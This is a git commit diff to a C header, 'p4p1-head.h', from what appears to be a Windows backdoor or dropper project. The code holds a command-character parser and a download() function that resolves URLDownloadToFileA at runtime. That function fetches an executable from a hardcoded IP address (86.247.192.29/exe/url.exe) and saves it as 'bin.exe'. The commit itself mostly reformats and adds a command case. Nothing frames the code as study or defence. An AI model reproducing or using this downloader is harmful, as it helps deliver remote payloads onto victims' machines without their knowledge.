4aa739132aa3dbe43efa743c9fe0a25fbc77aab3
Leo Smith <k0oo@icloud.com>
2016-07-03 12:45:03 +0200

    Update p4p1-head.h

--- p4p1-head.h
+++ p4p1-head.h
@@ -3,11 +3,11 @@
 #include <string.h>
 #include <winsock2.h>
 #include <windows.h>
-//#include "win/urlmon.h"
 
 #define str(a) #a
 #define xstr(a) str(a)
 #define BUFSIZE 9999
+#define LOCAL 0
 
 typedef HRESULT (WINAPI *UDTF)(LPVOID, LPCTSTR, LPCTSTR, DWORD, LPVOID);
 
@@ -20,6 +20,8 @@ int iscommand(char buf)
 		return 1;
 	} else if(buf == '&') {
 		return 2;
+	} else if(buf == '-'){
+		return 3;
 	} else {
 		return 0;
 	}
@@ -30,18 +32,16 @@ int download()
 	char * url = "http://86.247.192.29/exe/url.exe";
 	char * path = "bin.exe";
 	int r = 1;
-  HMODULE hDll;
-  UDTF URLDownloadToFile;
+	HMODULE hDll;
+	UDTF URLDownloadToFile;
 
-  if((hDll = LoadLibrary("urlmon")))
-  {
-    if((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA")))
-    {
-      if(URLDownloadToFile(0, url, path, 0, 0) == 0)
-        r = 0;
-    }
-    FreeLibrary(hDll);
-  }
+	if((hDll = LoadLibrary("urlmon"))) {
+		if((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA"))) {
+			if(URLDownloadToFile(0, url, path, 0, 0) == 0)
+				r = 0;
+	}
+		FreeLibrary(hDll);
+	}
 
-  return r;
+	return r;
 }
